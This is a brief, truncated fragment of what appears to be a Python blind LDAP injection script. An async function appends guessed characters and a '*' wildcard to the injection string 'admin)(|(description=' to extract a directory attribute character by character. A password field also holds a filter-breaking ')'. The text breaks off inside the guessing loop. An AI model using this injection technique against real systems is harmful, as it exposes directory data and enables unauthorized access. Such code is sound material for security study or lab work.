...
password = "invalid)"  # Replace with the valid password
...
async def brute_force_username(session):
    base_username = "admin)(|(description="
    valid_string = ""  # To store the successful characters

    while True:
        found_char = False
        for char in characters:
            username = base_username + valid_string + char + "*"  # Append character at the current position
